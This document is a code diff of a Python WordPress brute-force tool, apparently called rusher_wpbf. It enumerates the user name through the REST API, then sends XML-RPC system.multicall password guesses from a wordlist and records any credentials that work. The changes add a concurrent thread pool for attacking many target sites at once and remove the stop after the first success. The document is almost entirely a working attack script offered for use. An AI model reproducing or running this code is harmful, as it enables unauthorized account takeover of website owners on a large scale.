@@ -13,7 +13,7 @@ print("""
 =============================================================
 """)
 
-import os, random, requests
+import os, sys, random, requests, concurrent.futures
 from argparse import ArgumentParser
 from threading import Thread
 from time import sleep as delay
@@ -29,9 +29,10 @@ class rusher_wpbf:
 
         try:
 
-            x = requests.get(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent() }, timeout=5)
+            xmldata = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>'
+            x = requests.post(url="{}/xmlrpc.php".format(target), data=xmldata, headers={ "User-Agent": self.useragent(), 'Content-Type': 'application/xml' }, timeout=5)
 
-            if 'XML-RPC server' in x.text:
+            if '<methodResponse>' in x.text:
 
                 return True
 
@@ -47,7 +48,7 @@ class rusher_wpbf:
 
         try:
 
-            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent() }, timeout=5)
+            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent(), 'Content-Type': 'application/xml' }, timeout=5)
             return x.json()['name']
 
         except:
@@ -59,13 +60,12 @@ class rusher_wpbf:
         try:
 
             xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
-            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent() }, data=xml, timeout=5)
+            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent(), 'Content-Type': 'application/xml' }, data=xml, timeout=5)
 
             if "<name>isAdmin</name>" in x.text:
 
                 print("[+] [Success] [{}] -> ( {} | {} )".format(target, user, passwd))
-                open("result-wp/site.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
-                os._exit(1)
+                open("result-wp/success.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
 
             else:
 
@@ -84,6 +84,24 @@ class rusher_wpbf:
 
                 self.try_login = 0
 
+    def execution(self, target, wordlist, thread):
+        
+        if self.check_xmlrpc(target):
+
+            user = self.get_user(target)
+
+            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
+
+                for x in open(wordlist, errors="ignore").read().split("\n"):
+
+                    if x != '':
+
+                        executor.submit(self.req, target, user, x)
+
+        else:
+
+            print("[-] [Error] [{}] -> ( Not found xmlrpc.php )".format(target))
+
     def __init__(self):
 
         if not os.path.isdir("result-wp"):
@@ -94,33 +112,20 @@ class rusher_wpbf:
         parser = ArgumentParser()
         parser.add_argument("-x", "--target", required=True)
         parser.add_argument("-w", "--wordlist", required=True)
+        parser.add_argument("-t", "--thread", required=True, type=int)
         args = parser.parse_args()
 
         if os.path.isfile(args.target):
 
             if os.path.isfile(args.wordlist):
 
-                for target in open(args.target, errors="ignore").read().split("\n"):
+                with concurrent.futures.ThreadPoolExecutor(max_workers=args.thread) as executor:
 
-                    if target != '':
+                    for target in open(args.target, errors="ignore").read().split("\n"):
 
-                            if self.check_xmlrpc(target):
+                        if target != '':
 
-                                user = self.get_user(target)
-
-                                for x in open(args.wordlist, errors="ignore").read().split("\n"):
-
-                                    if x != '':
-
-                                        t = Thread(target=self.req, args=(target, user, x))
-                                        t.daemon = True
-                                        t.start()
-                                        delay(0.1)
-
-                            else:
-
-                                print("[-] [Error] [{}] -> ( Not found xmlrpc.php )".format(target))
-                                continue
+                            executor.submit(self.execution, target, args.wordlist, args.thread)
 
             else:
 
@@ -130,22 +135,7 @@ class rusher_wpbf:
 
             if os.path.isfile(args.wordlist):
 
-                if self.check_xmlrpc(args.target):
-
-                    user = self.get_user(args.target)
-
-                    for x in open(args.wordlist, errors="ignore").read().split("\n"):
-
-                        if x != '':
-
-                            t = Thread(target=self.req, args=(args.target, user, x))
-                            t.daemon = True
-                            t.start()
-                            delay(0.1)
-
-                else:
-
-                    print("[-] [Error] [{}] -> ( Not found xmlrpc.php )".format(args.target))
+                self.execution(args.target, args.wordlist, args.thread)
 
             else:
 
